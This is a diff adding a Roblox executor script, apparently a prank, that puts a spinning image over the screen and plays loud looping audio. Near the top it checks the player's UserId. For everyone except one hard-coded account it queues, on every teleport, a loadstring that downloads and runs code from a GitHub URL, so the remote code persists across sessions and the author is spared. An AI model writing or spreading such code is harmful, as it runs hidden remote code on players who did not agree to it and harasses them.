@@ -1,0 +1,36 @@
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+
+if Players.LocalPlayer.UserId ~= 4846427393 then
+  queue_on_teleport("loadstring(game:HttpGet('https://github.com/execute500/scripts/raw/refs/heads/main/?'))()")
+end
+
+local Main = Instance.new("ScreenGui")
+Main.Name = "fun"
+Main.Parent = CoreGui
+Main.ResetOnSpawn = false
+Main.IgnoreGuiInset = true
+
+local Image = Instance.new("ImageLabel")
+Image.Name = "Image"
+Image.Parent = Main
+Image.Size = UDim2.new(0, 800, 0, 800)
+Image.Position = UDim2.new(0.5, -400, 0.5, -400)
+Image.Image = "rbxassetid://18515944281"
+Image.BackgroundTransparency = 1
+
+local Audio = Instance.new("AudioPlayer")
+Audio.Name = "Audio"
+Audio.Parent = Main
+Audio.Asset = "rbxassetid://119789639296627"
+Audio.AutoLoad = true
+Audio.AutoPlay = true
+Audio.Looping = true
+Audio.Volume = 10
+Audio:Play(5)
+
+task.spawn(function()
+  while wait() do
+    Image.Rotation = Image.Rotation + 5
+  end
+end)
